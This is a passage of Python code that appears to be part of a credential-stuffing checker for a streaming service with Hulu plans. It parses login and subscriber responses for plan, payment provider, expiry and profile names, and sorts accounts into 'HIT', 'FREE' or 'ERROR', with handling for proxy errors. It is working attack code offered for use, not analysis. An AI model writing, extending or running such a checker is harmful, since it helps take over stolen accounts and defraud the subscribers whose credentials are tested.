            m = re.search(r'"geoIp":\{"country":"(.*?)"', login_text)
            info['country'] = m.group(1) if m else 'Unknown'
            m = re.search(r'"emailVerified":(.*?),', login_text)
            info['email_verified'] = m.group(1) if m else 'false'
            m = re.search(r'"isFreeTrial":(.*?)\},', login_text)
            info['free_trial'] = m.group(1) if m else 'false'
            m = re.search(r'"nextRenewalDate":"(.*?)T', login_text)
            info['expiry'] = m.group(1) if m else None
            m = re.search(r'"isSubscriber":(.*?),', login_text)
            info['is_subscriber'] = m.group(1) if m else 'false'

            profiles = re.findall(r'"name":"(.*?)"', login_text)
            info['profiles'] = profiles[:5] if profiles else []

            m = re.search(r',"earlyAccess":(.*?),', login_text)
            if m:
                gohan = m.group(1)
                m2 = re.search(re.escape(f'"earlyAccess":{gohan}') + r',"name":"(.*?)"', login_text)
                if m2:
                    info['plan'] = m2.group(1)
                    if 'hulu' in m2.group(1).lower():
                        info['hulu'] = True

            if not login_token:
                result['status'] = 'HIT'
                result['data'] = info
                return result

            sub_text = self._subscribers(session, ua, login_token)
            sub_low = sub_text.lower()
            if 'subscription.not.found' in sub_low or '"subscriberstatus":"churned"' in sub_low:
                result['status'] = 'FREE'
                result['data'] = info
                return result

            m = re.search(r'"subscriberStatus":"(.*?)"', sub_text)
            if m:
                info['subscriber_status'] = m.group(1)
            m = re.search(r'"billingCycle":"(.*?)"', sub_text)
            if m:
                info['billing_cycle'] = m.group(1)
            m = re.search(r'"name":"(.*?)"', sub_text)
            if m and not info.get('plan'):
                info['plan'] = m.group(1)
            m = re.search(r'"toDate":"(.*?)T', sub_text)
            if m:
                info['expiry'] = m.group(1)
            m = re.search(r'"paymentProvider":"(.*?)"', sub_text)
            if m:
                info['payment_provider'] = m.group(1)

            if info.get('expiry'):
                try:
                    exp = datetime.strptime(info['expiry'], '%Y-%m-%d').replace(tzinfo=timezone.utc)
                    info['remaining_days'] = (exp - datetime.now(timezone.utc)).days
                except:
                    pass

            if info.get('subscriber_status', '').upper() == 'ACTIVE' or info.get('is_subscriber') == 'true':
                result['status'] = 'HIT'
                result['data'] = info
                return result
            if info.get('remaining_days') is not None and info['remaining_days'] < 0:
                result['status'] = 'FREE'
                result['data'] = info
                return result

            result['status'] = 'HIT'
            result['data'] = info
            return result

        except requests.exceptions.ProxyError:
            result['status'] = 'ERROR'
            result['error'] = "Proxy error"
            return result
        except requests.exceptions.Timeout:
            result['status'] = 'ERROR'
            result['error'] = "Timeout"
            return result
        except requests.exceptions.ConnectionError:
            result['status'] = 'ERROR'
            result['error'] = "Connection failed"
            return result
        except Exception as e:
            result['status'] = 'ERROR'
            result['error'] = str(e)[:80]
            return result